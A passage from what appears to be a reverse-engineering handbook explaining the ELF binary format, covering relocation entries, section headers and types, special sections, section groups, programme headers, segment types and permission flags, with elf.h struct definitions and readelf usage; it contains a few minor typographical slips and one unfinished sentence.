<p>These relocation entries are represented by the following structs and are stored in <em>relocation sections</em>:</p>
<pre><code class="language-cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
} Elf32_Rel;

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
} Elf64_Rel;

/* Relocation table entry with addend (in section of type SHT_RELA).  */

typedef struct
{
  Elf32_Addr	r_offset;		/* Address */
  Elf32_Word	r_info;			/* Relocation type and symbol index */
  Elf32_Sword	r_addend;		/* Addend */
} Elf32_Rela;

typedef struct
{
  Elf64_Addr	r_offset;		/* Address */
  Elf64_Xword	r_info;			/* Relocation type and symbol index */
  Elf64_Sxword	r_addend;		/* Addend */
} Elf64_Rela;
</code></pre>
<p>The <code>r_offset</code> field points to the location that ultimately needs to be altered when the relocation is performed. For example, for functions this will typically point to somewhere in the Global Offset Table. For relocatable files this field contains an offset within a section to be modified. For shared objects and executable files, <code>r_offset</code> stores a virtual address where the relocation should take place.</p>
<p><code>r_info</code> holds the symbol table index for the associated index as well as the type of relocation to be performed, which is platform-specific. Relocation types are ultimately computations that are performed in order to determine what value is to be stored at the relocation site. This information can be extracted by means of the following macros:</p>
<pre><code class="language-cpp">#define ELF32_R_SYM(val)		((val) &gt;&gt; 8)
#define ELF32_R_TYPE(val)		((val) &amp; 0xff)
#define ELF32_R_INFO(sym, type)		(((sym) &lt;&lt; 8) + ((type) &amp; 0xff))

#define ELF64_R_SYM(i)			((i) &gt;&gt; 32)
#define ELF64_R_TYPE(i)			((i) &amp; 0xffffffff)
#define ELF64_R_INFO(sym,type)		((((Elf64_Xword) (sym)) &lt;&lt; 32) + (type))
</code></pre>
<p><code>r_addend</code> just specifies a constant value which is used to compute the value which will be ultimately stored at the relocation site.</p>
<p>Entries of type <code>ElfN_Rel</code> are stored in sections of type <code>SHT_REL</code>, while entries of type <code>ElfN_Rela</code> are stored in sections of type <code>SHT_RELA</code>. An ELF file may only contain relocation entries of one type and the reasons for using one type over the other are typically architecture-dependent. Every relocation sections can contain references to two other sections. First of all, a relocation section will be linked to its corresponding symbol table and the index of its section header can be retrieved from the <code>sh_link</code> field of the relocation section. For relocatable files, the index of the section for which <code>r_offset</code> is relevant is stored in the <code>sh_info</code> field of the relocation section's header.</p>
<p>You can view the relocation entries of an ELF file by using the <code>-r</code> flag with <code>readelf</code>:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Read_Relocations.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-23"><a class="header" href="#introduction-23">Introduction</a></h1>
<p>Sections comprise the entirety of an ELF binary with the exception of the <a href="Reverse%20Engineering/Binary%20Formats/ELF/The%20ELF%20Header.html">ELF header</a>, the Programme Header Table and the Section Header Table. Each section is characterised by a single section header. A section must occupy a contiguous block of space in the file and section overlap is not allowed - each byte in the file may only belong to a single function. However, bytes may also pertain to no sections at all, in which case their contents are unspecified.</p>
<p>It is paramount to understand that sections are <em>not</em> loaded as such into the memory image of the binary. Instead, specific parts from them are organised and grouped by the ELF segments. You can imagine sections as turning into segments during load-time. Sections themselves are really only relevant for linking and debugging purposes.</p>
<h1 id="the-section-header-table-sht"><a class="header" href="#the-section-header-table-sht">The Section Header Table (SHT)</a></h1>
<p>Sections are described by <em>section headers</em> which are in turn stored in the <em>Section Header Table (SHT)</em>. Since the SHT is not pertinent to a binary at runtime, it may be stripped from the file entirely. A corollary of this is the fact that while every ELF object has sections, but not every ELF object has section <em>headers</em>. In fact, a common procedure for hindering reverse engineering and debugging of a binary is to strip the section header table, which makes life rather difficult for debuggers, since they will be unable to directly reference symbol information. Note, however, that this information may still be recovered via analysis of the rest of the binary, and more specifically, of the Programme Header Table due to its inherent overlap between segments and sections.</p>
<p>Ultimately, the section header table is an array of the following structures:</p>
<pre><code class="language-cpp">
typedef struct
{
  Elf32_Word	sh_name;		/* Section name (string tbl index) */
  Elf32_Word	sh_type;		/* Section type */
  Elf32_Word	sh_flags;		/* Section flags */
  Elf32_Addr	sh_addr;		/* Section virtual addr at execution */
  Elf32_Off	sh_offset;		/* Section file offset */
  Elf32_Word	sh_size;		/* Section size in bytes */
  Elf32_Word	sh_link;		/* Link to another section */
  Elf32_Word	sh_info;		/* Additional section information */
  Elf32_Word	sh_addralign;		/* Section alignment */
  Elf32_Word	sh_entsize;		/* Entry size if section holds table */
} Elf32_Shdr;

typedef struct
{
  Elf64_Word	sh_name;		/* Section name (string tbl index) */
  Elf64_Word	sh_type;		/* Section type */
  Elf64_Xword	sh_flags;		/* Section flags */
  Elf64_Addr	sh_addr;		/* Section virtual addr at execution */
  Elf64_Off	sh_offset;		/* Section file offset */
  Elf64_Xword	sh_size;		/* Section size in bytes */
  Elf64_Word	sh_link;		/* Link to another section */
  Elf64_Word	sh_info;		/* Additional section information */
  Elf64_Xword	sh_addralign;		/* Section alignment */
  Elf64_Xword	sh_entsize;		/* Entry size if section holds table */
} Elf64_Shdr;
</code></pre>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Section_Header.png" alt="" /></p>
<ul>
<li><code>sh_name</code> - the offset (in bytes) from the beginning of the section name string table at which the name of the current section is located.</li>
<li><code>sh_type</code> - the type of the section.</li>
<li><code>sh_flags</code> - sections support 1-bit flags which describe certain attributes.</li>
<li><code>sh_addr</code> - if the section is to be loaded into the memory image of the file, this field contains the address at which the section should reside. It holds 0 otherwise.</li>
<li><code>sh_offset</code> - the offset (in bytes) from the beginning of the file where the section resides. For sections of type <code>SHT_NOBITS</code>, this portrays only a conceptual position.</li>
<li><code>sh_size</code> - the section's size in bytes. Sections of type <code>SHT_NOBITS</code> may have this field set to a non-zero value, but will still occupy no space in the file.</li>
<li><code>sh_link</code> - a link to another section header. The interpretation of this field depends on the section's type.</li>
<li><code>sh_info</code> - this field holds additional information and its interpretation is different based on the section's type</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th><code>sh_type</code></th><th><code>sh_link</code></th><th><code>sh_info</code></th></tr></thead><tbody>
<tr><td><code>SHT_DYNAMIC</code></td><td>The section header index of the string table used by entries in the section.</td><td>0</td></tr>
<tr><td><code>SHT_HASH</code></td><td>The section header index of the symbol table to which the hash table pertains.</td><td>0</td></tr>
<tr><td><code>SHT_RELSHT_RELA</code></td><td>The section header index of the associated symbol table.</td><td>The section header index of the section to which the relocation applies.</td></tr>
<tr><td><code>SHT_SYMTABSHT_DYNSYM</code></td><td>The section header index of the associated string table.</td><td>One greater than the symbol table index of the last local symbol (binding STB_LOCAL).</td></tr>
<tr><td><code>SHT_GROUP</code></td><td>The section header index of the associated symbol table.</td><td>The symbol table index of an entry in the associated symbol table.  The name of the specified symbol table entry provides a signature for the section group.</td></tr>
<tr><td><code>SHT_SYMTAB_SHNDX</code></td><td>The section header index of the associated symbol table section.</td><td>0</td></tr>
</tbody></table>
</div>
<ul>
<li><code>sh_addralign</code> - certain sections have alignment constraints. For example, if the section holds a doubleword, doubleword alignment is to be ensured for the entire section. Values 0 and 1 mean that the section requires no special alignment. Otherwise, only positive integral values of 2 are allowed for this field. Ultimately, <code>sh_addr</code> must be divisible by <code>sh_addralign</code>.</li>
<li><code>sh_entsize</code> - if the section contains some sort of a table of fixed-sized entries, this field holds the entry size. If no such table is present, this member holds 0.</li>
</ul>
<p>If the number of section headers is greater than or equal to <code>SHN_LORESERVE (0xff00)</code>, then the <code>e_shnum</code> field of the ELF header holds <code>SHN_UNDEF (0)</code> and the actual number of section headers is stored in the <code>sh_size</code> field of the first entry in the section header table. </p>
<p>Certain indices in the section header table are reserved. The first section header has the following form:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th><th>Note</th></tr></thead><tbody>
<tr><td><code>sh_name</code></td><td style="text-align: center">0</td><td>No name</td></tr>
<tr><td><code>sh_type</code></td><td style="text-align: center">SHT_NULL</td><td>Inactive</td></tr>
<tr><td><code>sh_flags</code></td><td style="text-align: center">0</td><td>No flags</td></tr>
<tr><td><code>sh_addr</code></td><td style="text-align: center">0</td><td>No address</td></tr>
<tr><td><code>sh_offset</code></td><td style="text-align: center">0</td><td>No offset</td></tr>
<tr><td><code>sh_size</code></td><td style="text-align: center">Unspecified</td><td>If non-zero, the actual number of section header entries</td></tr>
<tr><td><code>sh_link</code></td><td style="text-align: center">Unspecified</td><td>If non-zero, the index of the section header string table section</td></tr>
<tr><td><code>sh_info</code></td><td style="text-align: center">0</td><td>No auxiliary information</td></tr>
<tr><td><code>sh_addralign</code></td><td style="text-align: center">0</td><td>No alignment</td></tr>
<tr><td><code>sh_entsize</code></td><td style="text-align: center">0</td><td>No entries</td></tr>
</tbody></table>
</div>
<p>The other reserved indices are described in the following table:</p>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th style="text-align: center">Value</th></tr></thead><tbody>
<tr><td><code>SHN_UNDEF</code></td><td style="text-align: center"><code>0</code></td></tr>
<tr><td><code>SHN_LORESERVE</code></td><td style="text-align: center"><code>0xff00</code></td></tr>
<tr><td><code>SHN_LOPROC</code></td><td style="text-align: center"><code>0xff00</code></td></tr>
<tr><td><code>SHN_HIPROC</code></td><td style="text-align: center"><code>0xff1f</code></td></tr>
<tr><td><code>SHN_LOOS</code></td><td style="text-align: center"><code>0xff20</code></td></tr>
<tr><td><code>SHN_HIOS</code></td><td style="text-align: center"><code>0xff3f</code></td></tr>
<tr><td><code>SHN_ABS</code></td><td style="text-align: center"><code>0xfff1</code></td></tr>
<tr><td><code>SHN_COMMON</code></td><td style="text-align: center"><code>0xfff2</code></td></tr>
<tr><td><code>SHN_XINDEX</code></td><td style="text-align: center"><code>0xffff</code></td></tr>
<tr><td><code>SHN_HIRESERVE</code></td><td style="text-align: center"><code>0xffff</code></td></tr>
</tbody></table>
</div>
<ul>
<li><code>SHN_LORESERVE</code> - the lower bound for reserved indices.</li>
<li><code>SHN_LOPROC</code> through <code>SHN_HIPROC</code> - reserved for processor-specific semantics.</li>
<li><code>SHN_LOOS</code> through <code>SHN_HIOS</code> - reserved for OS-specific semantics.</li>
<li><code>SHN_ABS</code> - specifies absolute values. For example, symbol definitions relative to this section number are absolutes and are not affected by relocation.</li>
<li><code>SHN_COMMON</code> - symbols defined relative to this section are &quot;common&quot; symbols such as unallocated <code>C</code> external variables.</li>
<li><code>SHN_XINDEX</code> - an escape value denoting an index which cannot fit in the containing field and thus must be found elsewhere (this is specific to the structure it is found in).</li>
<li><code>SHN_HIRESERVE</code> - the upper bound for reserved indices.</li>
</ul>
<p>You can view the section header table by using the <code>-S</code> option in <code>readelf</code>.</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_read_SHT.png" alt="" /></p>
<h1 id="section-types"><a class="header" href="#section-types">Section Types</a></h1>
<h2 id="sht_null"><a class="header" href="#sht_null"><code>SHT_NULL</code></a></h2>
<p>The section header is marked as inactive and lacks an associated section. The rest of the members of such a header have undefined values.</p>
<h2 id="sht_progbits"><a class="header" href="#sht_progbits"><code>SHT_PROGBITS</code></a></h2>
<p>The section contains data whose contents are solely defined and used by the actual programme.</p>
<h2 id="sht_symtab-and-sht_dynsym"><a class="header" href="#sht_symtab-and-sht_dynsym"><code>SHT_SYMTAB</code> and <code>SHT_DYNSYM</code></a></h2>
<p>These sections hold symbol tables. A file may contain at most one from each type of symbol table. Since <code>SHT_SYMTAB</code> is a complete symbol table, it is useful for both link editing and dynamic linking. However, its completeness comes with sizeable contents, so an ELF file may also contain an <code>SHT_DYNSYM</code> section which stores only symbols for dynamic linking. Only the latter may be loaded into memory.</p>
<h2 id="sht_strtab"><a class="header" href="#sht_strtab"><code>SHT_STRTAB</code></a></h2>
<p>This section is a string table. A file may have multiple string tables for different purposes.</p>
<h2 id="sht_rela-and-sht_rel"><a class="header" href="#sht_rela-and-sht_rel"><code>SHT_RELA</code> and <code>SHT_REL</code></a></h2>
<p>These sections hold relocation entries with without explicit addends, respectively. Multiple relocation sections are allowed per file.</p>
<h2 id="sht_hash"><a class="header" href="#sht_hash"><code>SHT_HASH</code></a></h2>
<p>The section is a symbol hash table. An ELF file may contain only one such section.</p>
<h2 id="sht_dynamic"><a class="header" href="#sht_dynamic"><code>SHT_DYNAMIC</code></a></h2>
<p>This section stores information relevant for dynamic linking. Only one such section is allowed for the entire file.</p>
<h2 id="sht_note"><a class="header" href="#sht_note"><code>SHT_NOTE</code></a></h2>
<p>This section stores auxiliary information.</p>
<h2 id="sht_nobits"><a class="header" href="#sht_nobits"><code>SHT_NOBITS</code></a></h2>
<p>This section occupies no file space but otherwise resembles <code>SHT_PROGBITS</code>. Whilst the section has a size of 0, the <code>sh_offset</code> field of the header contains the conceptual file offset.</p>
<h2 id="sht_preinit_array-sht_init_array-and-sht_fini_array"><a class="header" href="#sht_preinit_array-sht_init_array-and-sht_fini_array"><code>SHT_PREINIT_ARRAY</code>, <code>SHT_INIT_ARRAY</code>, and <code>SHT_FINI_ARRAY</code></a></h2>
<p><code>SHT_PREINIT_ARRAY</code> stores pointers to functions which are invoked before any initialisation functions, while <code>SHT_INIT_ARRAY</code> and <code>SHT_FINI_ARRAY</code> have pointers which point to initialisation and termination functions, respectively. All pointers represent procedures with no parameters and a <code>void</code> return.</p>
<h2 id="sht_group"><a class="header" href="#sht_group"><code>SHT_GROUP</code></a></h2>
<p>This section specifies a section group. Section groups represent sets of related sections that must be treated by the linker in a special way. Such sections may only appear in relocatable files and the SHT entry for the group must precede any of the group's members in the section header table.</p>
<h2 id="sht_symtab_shndx"><a class="header" href="#sht_symtab_shndx"><code>SHT_SYMTAB_SHNDX</code></a></h2>
<p>This section is associated with an <code>SHT_SYMTAB</code> section and is required if any of the entries in the symbols table contain section header references to <code>SHN_XINDEX</code>. It holds an array of words and each entry corresponds to a </p>
<h2 id="other"><a class="header" href="#other">Other</a></h2>
<p>The <code>SHT_SHLIB</code> section type is reserved but unspecified. As always, values from <code>SHT_LOOS</code> through <code>SHT_HIOS</code> and from <code>SHT_LOPROC</code> through <code>SHT_HIPROC</code> are reserved for OS- and processor-specific semantics, respectively. Values between <code>SHT_LOUSER</code> and <code>SHT_HIUSER</code> may be used as per the application's needs without creating any conflicts.</p>
<h2 id="special-sections"><a class="header" href="#special-sections">Special Sections</a></h2>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Type</th><th>Attributes</th></tr></thead><tbody>
<tr><td>.bss</td><td><code>SHT_NOBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.comment</td><td><code>SHT_PROGBITS</code></td><td>none</td></tr>
<tr><td>.data</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.data1</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.debug</td><td><code>SHT_PROGBITS</code></td><td>none</td></tr>
<tr><td>.dynamic</td><td><code>SHT_DYNAMIC</code></td><td><code>SHF_ALLOC+...</code></td></tr>
<tr><td>.dynstr</td><td><code>SHT_STRTAB</code></td><td><code>SHF_ALLOC</code></td></tr>
<tr><td>.dynsym</td><td><code>SHT_DYNSYM</code></td><td><code>SHF_ALLOC</code></td></tr>
<tr><td>.fini</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_EXECINSTR</code></td></tr>
<tr><td>.fini_array</td><td><code>SHT_FINI_ARRAY</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.got</td><td><code>SHT_PROGBITS</code></td><td>?</td></tr>
<tr><td>.hash</td><td><code>SHT_HASH</code></td><td><code>SHF_ALLOC</code></td></tr>
<tr><td>.init</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_EXECINSTR</code></td></tr>
<tr><td>.init_array</td><td><code>SHT_INIT_ARRAY</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.interp</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.line</td><td><code>SHT_PROGBITS</code></td><td>none</td></tr>
<tr><td>.note</td><td><code>SHT_NOTE</code></td><td>none</td></tr>
<tr><td>.plt</td><td><code>SHT_PROGBITS</code></td><td>?</td></tr>
<tr><td>.preinit_array</td><td><code>SHT_PREINIT_ARRAY</code></td><td><code>SHF_ALLOC+SHF_WRITE</code></td></tr>
<tr><td>.rel<em>name</em></td><td><code>SHT_REL</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.rela<em>name</em></td><td><code>SHT_RELA</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.rodata</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC</code></td></tr>
<tr><td>.rodata1</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC</code></td></tr>
<tr><td>.shstrtab</td><td><code>SHT_STRTAB</code></td><td>none</td></tr>
<tr><td>.strtab</td><td><code>SHT_STRTAB</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.symtab</td><td><code>SHT_SYMTAB</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.symtab_shndx</td><td><code>SHT_SYMTAB_SHNDX</code></td><td><code>SHF_ALLOC</code>/none</td></tr>
<tr><td>.tbss</td><td><code>SHT_NOBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE+SHF_TLS</code></td></tr>
<tr><td>.tdata</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE+SHF_TLS</code></td></tr>
<tr><td>.tdata1</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_WRITE+SHF_TLS</code></td></tr>
<tr><td>.text</td><td><code>SHT_PROGBITS</code></td><td><code>SHF_ALLOC+SHF_EXECINSTR</code></td></tr>
</tbody></table>
</div>
<ul>
<li><code>.bss</code> - this section holds uninitialised data that contributes to a process's memory image. It occupies no space in the file and gets filled with 0s when the programme is run.</li>
<li><code>.comment</code> - used for version control.</li>
<li><code>.data</code> and <code>.data1</code> - these hold initialised data that contributes to a process's memory image.</li>
<li><code>.debug</code> - holds debugging information and has unspecified contents.</li>
<li><code>.dynamic</code> - This section holds dynamic linking information and its attributes will include the <code>SHF_ALLOC</code> bit. Whether the <code>SHF_WRITE</code> bit is set, however, is processor specific.</li>
<li><code>.dynstr</code> - this is a string table containing the strings necessary for dynamic linking such as symbol names.</li>
<li><code>.dynsym</code> - this section holds the dynamic symbol linking table.</li>
<li><code>.fini</code> - contains instructions which contribute to process termination. Execution flow is transferred here when a process exits successfully.</li>
<li><code>.fini_array</code> - this section holds function pointers for process termination.</li>
<li><code>.got</code> - the Global Offset Table.</li>
<li><code>.hash</code> - this section holds a symbol hash table.</li>
<li><code>.init</code> - this section contains instructions relevant to process initialisation. The code here is executed before control is transferred to the programme's entry point (called <code>main</code> in most cases).</li>
<li><code>.init_array</code> - this section holds function pointers for process initialisation.</li>
<li><code>.interp</code> - this section holds the path name of the programme interpreter. If the file has a loadable segment with relocation, the sections' attributes will include the <code>SHF_ALLOC</code> bit.</li>
<li><code>.line</code> - this section holds line number information for debugging with source files.</li>
<li><code>.note</code> - this section holds auxiliary information.</li>
<li><code>.plt</code> - this section holds the Procedure Linkage Table.</li>
<li><code>.preinit_array</code> - this section holds function pointers for pre-initialisation.</li>
<li><code>.rel</code><em>name</em> and <code>.rela</code><em>name</em> - these sections hold relocation information, where <em>name</em> is the name of the section for which the relocations are relevant such as <code>.rel.text</code> or <code>.rela.text</code>. If the file has a loadable segment that includes relocation, the sections' attributes will include the <code>SHF_ALLOC</code> bit.</li>
<li><code>.rodata</code> and <code>.rodata1</code> - these sections hold read-only data that gets loaded into the memory image of the process.</li>
<li><code>.shstrtab</code> - the string table for the section names.</li>
<li><code>.strtab</code> - a string table which typically holds symbol names. If the file has a loadable segment that includes the symbol string table, the section's attributes will include the <code>SHF_ALLOC</code> bit.</li>
<li><code>.symtab</code> - the complete symbol table. If the file has a loadable segment that includes the symbol table, the section's attributes will include the <code>SHF_ALLOC</code> bit.</li>
<li><code>.symtab_shndx</code> - this section holds the special symbol table section index array described above. The section's attributes will include the <code>SHF_ALLOC</code> bit if the associated symbol table section does.</li>
<li><code>.tbss</code> - this section holds uninitialised thread-local data which contributes to the memory image. This data is set to all 0s for each new execution flow and occupies no bytes in the file.</li>
<li><code>.tdata</code> - this section holds initialised thread-local data which contributes to the memory image. A copy of it is generated for each new execution flow.</li>
<li><code>.text</code> - this section holds the executable instructions of the programme.</li>
</ul>
<h1 id="section-groups"><a class="header" href="#section-groups">Section Groups</a></h1>
<p>Some sections occur in interrelated groups or contain references to other sections which become meaningless if the referenced object is removed or altered. Such groups must be included or omitted from the linked object together and may not be separated. Each section is only allowed to be part of a single group. </p>
<p>Such a grouping of sections is denoted by the <code>SHT_GROUP</code> type. In one of the ELF object's symbol tables is an entry whose name provides a signature for the section group. The section header of the <code>SHT_GROUP</code> section specifies this entry: The <code>sh_link</code> field contains the section header index of the symbol table section that contains the entry, while <code>sh_info</code> holds the symbol table index for the appropriate entry. </p>
<p>The data within an <code>SHT_GROUP</code> section is comprised of word entries, where the first entry is a flag word and the rest are section header indices of the sections which make up the group. The sections must each have the <code>SHF_GROUP</code> flag set in their <code>sh_flags</code> fields.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-24"><a class="header" href="#introduction-24">Introduction</a></h1>
<p>Segments split the ELF binary into parts which are then loaded into memory by the OS programme loader. They can be thought of as grouping sections by their attributes and only selecting those which will be loaded into memory. In essence, segments contain information needed at runtime, while sections contain information needed at link-time. </p>
<h1 id="the-programme-header-table"><a class="header" href="#the-programme-header-table">The Programme Header Table</a></h1>
<p>Segments are described by <em>programme headers</em> which are stored in the Programme Header Table (PHT). These structs are again defined in <code>&lt;elf.h&gt;</code>:</p>
<pre><code class="language-cpp">typedef struct
{
  Elf32_Word	p_type;			/* Segment type */
  Elf32_Off	    p_offset;		/* Segment file offset */
  Elf32_Addr	p_vaddr;		/* Segment virtual address */
  Elf32_Addr	p_paddr;		/* Segment physical address */
  Elf32_Word	p_filesz;		/* Segment size in file */
  Elf32_Word	p_memsz;		/* Segment size in memory */
  Elf32_Word	p_flags;		/* Segment flags */
  Elf32_Word	p_align;		/* Segment alignment */
} Elf32_Phdr;

typedef struct
{
  Elf64_Word	p_type;			/* Segment type */
  Elf64_Word	p_flags;		/* Segment flags */
  Elf64_Off	    p_offset;		/* Segment file offset */
  Elf64_Addr	p_vaddr;		/* Segment virtual address */
  Elf64_Addr	p_paddr;		/* Segment physical address */
  Elf64_Xword	p_filesz;		/* Segment size in file */
  Elf64_Xword	p_memsz;		/* Segment size in memory */
  Elf64_Xword	p_align;		/* Segment alignment */
} Elf64_Phdr;
</code></pre>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_Programme_Header.png" alt="" /></p>
<ul>
<li><code>p_type</code> - describes the type of the segment.</li>
<li><code>p_offset</code> - the offset from the beginning of the file where the segment resides.</li>
<li><code>p_vaddr</code> - the virtual address at which the segment resides in memory.</li>
<li><code>p_paddr</code> - the segment's physical address, which is relevant only for systems with physical addressing. This member holds unspecified contents for executables and shared objects</li>
<li><code>p_filesz</code> - the number of bytes the segment occupies in the file image. It may be 0.</li>
<li><code>p_memsz</code> - the number of bytes the segment occupies in the memory image. It may be 0.</li>
<li><code>p_align</code> - the value to which the segments are aligned in the file and in memory. If this holds 0 or 1, then no alignment is required. Otherwise, <code>p_align</code> should be a positive integer power of 2 and <code>p_vaddr</code> should be equal to <code>p_offset % p_align</code>.</li>
</ul>
<p>The PHT can be viewed by specifying the <code>-l</code> argument to <code>readelf</code>:</p>
<p><img src="Reverse%20Engineering/Binary%20Formats/ELF/Resources/Images/ELF_read_PHT.png" alt="" /></p>
<h1 id="segment-types"><a class="header" href="#segment-types">Segment Types</a></h1>
<div class="table-wrapper"><table><thead><tr><th>Name</th><th>Value</th></tr></thead><tbody>
<tr><td><code>PT_NULL</code></td><td>0</td></tr>
<tr><td><code>PT_LOAD</code></td><td>1</td></tr>
<tr><td><code>PT_DYNAMIC</code></td><td>2</td></tr>
<tr><td><code>PT_INTERP</code></td><td>3</td></tr>
<tr><td><code>PT_NOTE</code></td><td>4</td></tr>
<tr><td><code>PT_SHLIB</code></td><td>5</td></tr>
<tr><td><code>PT_PHDR</code></td><td>6</td></tr>
<tr><td><code>PT_TLS</code></td><td>7</td></tr>
<tr><td><code>PT_LOOS</code></td><td>0x60000000</td></tr>
<tr><td><code>PT_HIOS</code></td><td>0x6fffffff</td></tr>
<tr><td><code>PT_LOPROC</code></td><td>0x70000000</td></tr>
<tr><td><code>PT_HIPROC</code></td><td>0x7fffffff</td></tr>
</tbody></table>
</div>
<h2 id="pt_load"><a class="header" href="#pt_load"><code>PT_LOAD</code></a></h2>
<p>This specifies a loadable segment described by <code>p_filesz</code> and <code>p_memsz</code> which means the segment is going to be mapped into memory. Bytes from the file are mapped to the beginning of the memory segment. Should the memory size be larger than the file size, the extra bytes are filled with 0s and are placed after the segment's data. Note that the file size cannot be larger than the memory size. </p>
<p>Entries of this type are sorted in an ascending order in the PHT according to their <code>p_vaddr</code> field.</p>
<p>All executable files must contain at least one <code>PT_LOAD</code> segment.</p>
<h2 id="pt_dynamic"><a class="header" href="#pt_dynamic"><code>PT_DYNAMIC</code></a></h2>
<p>The dynamic segment is pertinent to executables which avail themselves of dynamic linking and contains information for the dynamic linker. It typically points to the <code>.dynamic</code> section and comprises a series of structures which hold the relevant information. </p>
<pre><code class="language-cpp">typedef struct
{
  Elf32_Sword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf32_Word d_val;			/* Integer value */
      Elf32_Addr d_ptr;			/* Address value */
    } d_un;
} Elf32_Dyn;

typedef struct
{
  Elf64_Sxword	d_tag;			/* Dynamic entry type */
  union
    {
      Elf64_Xword d_val;		/* Integer value */
      Elf64_Addr d_ptr;			/* Address value */
    } d_un;
} Elf64_Dyn;
</code></pre>
<p>In essence, the <code>d_tag</code> field determines whether the <code>d_un</code> field is treated as a value or an address.</p>
<h2 id="pt_note"><a class="header" href="#pt_note"><code>PT_NOTE</code></a></h2>
<p>This segment is completely optional and may contain information that is pertinent to a specific system. It can hold a variable number of entries of size 4 or 8 bytes on 32-bit and 64-bit platforms, respectively.</p>
<h2 id="pt_interp"><a class="header" href="#pt_interp"><code>PT_INTERP</code></a></h2>
<p>Here are specified the location and size of a null terminated string which describes the programme interpreter. Only one such segment is allowed per file and it must also precede any <code>PT_LOAD</code> segments.</p>
<h2 id="pt_phdr"><a class="header" href="#pt_phdr"><code>PT_PHDR</code></a></h2>
<p>This segment contains the location and size of the Programme Header Table itself, both in the file and in memory. Similarly to <code>PT_INTERP</code>, only one such segment is allowed per file and it must also precede any <code>PT_LOAD</code> segments.</p>
<h2 id="pt_tls"><a class="header" href="#pt_tls"><code>PT_TLS</code></a></h2>
<p>This segment specifies the Thread-Local Storage template. The latter is an amalgamation of all sections of type <code>SHF_TLS</code>. TLS sections are used to specify the size and initial contents of data whose copies are to be associated with different threads of execution. The part of the TLS which holds this initialised data is referred to as the <em>TLS initialisation image</em>, while the rest of the template is comprised of one or more sections of type <code>SHF_NOBITS</code>.</p>
<div class="table-wrapper"><table><thead><tr><th>Member</th><th>Value</th></tr></thead><tbody>
<tr><td><code>p_offset</code></td><td>File offset of the TLS initialization image</td></tr>
<tr><td><code>p_vaddr</code></td><td>Virtual memory address of the TLS initialization image</td></tr>
<tr><td><code>p_paddr</code></td><td>reserved</td></tr>
<tr><td><code>p_filesz</code></td><td>Size of the TLS initialization image</td></tr>
<tr><td><code>p_memsz</code></td><td>Total size of the TLS template</td></tr>
<tr><td><code>p_flags</code></td><td><code>PF_R</code></td></tr>
<tr><td><code>p_align</code></td><td>Alignment of the TLS template</td></tr>
</tbody></table>
</div>
<h2 id="other-segments"><a class="header" href="#other-segments">Other Segments</a></h2>
<p><code>PT_SHLIB</code> is reserved but is unspecified, while values from <code>PT_LOOS</code> to <code>PT_HIOS</code> and from <code>PT_LOPROC</code> through <code>PT_HIPROC</code> are reserved for OS- and processor-specific semantics, respectively.</p>
<h1 id="segment-flags"><a class="header" href="#segment-flags">Segment Flags</a></h1>
<p>The <code>p_flags</code> field describes the permissions the segment is equipped with. It is important to note that the system may actually give more access than requested with the exception that a segment will never be assigned write permissions, unless explicitly requested:</p>
<div class="table-wrapper"><table><thead><tr><th>Flags</th><th style="text-align: center">Value</th><th>Exact</th><th>Allowable</th></tr></thead><tbody>
<tr><td>none</td><td style="text-align: center">0</td><td>All access denied</td><td>All access denied</td></tr>
<tr><td><code>PF_X</code></td><td style="text-align: center">1</td><td>Execute only</td><td>Read, execute</td></tr>
<tr><td><code>PF_W</code></td><td style="text-align: center">2</td><td>Write only</td><td>Read, write, execute</td></tr>
<tr><td><code>PF_W+PF_X</code></td><td style="text-align: center">3</td><td>Write, execute</td><td>Read, write, execute</td></tr>
<tr><td><code>PF_R</code></td><td style="text-align: center">4</td><td>Read only</td><td>Read, execute</td></tr>
<tr><td><code>PF_R+PF_X</code></td><td style="text-align: center">5</td><td>Read, execute</td><td>Read, execute</td></tr>
<tr><td><code>PF_R+PF_W</code></td><td style="text-align: center">6</td><td>Read, write</td><td>Read, write, execute</td></tr>
<tr><td><code>PF_R+PF_W+PF_X</code></td><td style="text-align: center">7</td><td>Read, write, execute</td><td>Read, write, execute</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="introduction-25"><a class="header" href="#introduction-25">Introduction</a></h1>
